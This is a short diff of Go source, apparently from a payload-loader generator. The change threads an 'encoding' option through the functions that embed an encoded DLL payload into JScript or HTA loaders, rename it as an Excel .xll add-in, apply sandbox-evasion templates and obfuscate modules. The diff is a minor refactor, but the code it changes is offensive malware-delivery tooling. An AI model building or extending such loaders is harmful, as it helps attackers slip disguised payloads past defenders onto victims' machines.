@@ -815,7 +815,7 @@ func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool)
 
 }
 
-func JScript_Buff(fso string, dropPath string, encoded string, code string, name string, mode string, sandbox bool) string {
+func JScript_Buff(fso string, dropPath string, encoded string, code string, name string, mode string, sandbox bool, encoding string) string {
 	var buffer bytes.Buffer
 	JScript := &JScript{}
 	SandboxJScript := &SandboxJScript{}
@@ -861,7 +861,7 @@ func JScript_Buff(fso string, dropPath string, encoded string, code string, name
 		JScript.Variables["FileName"] = name
 	}
 	buffer.Reset()
-	JSTemplate, err := template.New("JScript").Parse(Struct.JSfile("b62"))
+	JSTemplate, err := template.New("JScript").Parse(Struct.JSfile(encoding))
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -981,7 +981,7 @@ func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string,
 	Utils.ModuleObfuscator(name)
 	return name, filename
 }
-func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool) {
+func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool, encoding string) {
 	if mode == "excel" {
 		os.Rename(name+".dll", name+".xll")
 	} else if mode == "control" {
@@ -1025,7 +1025,7 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 	reader := bufio.NewReader(f)
 	content, _ := ioutil.ReadAll(reader)
 	encoded := base64.StdEncoding.EncodeToString(content)
-	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
+	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox, encoding)
 	URL = Utils.Command(URL, CommandLoader, outFile)
 	if CommandLoader == "hta" {
 		hexcode := hex.EncodeToString(content)
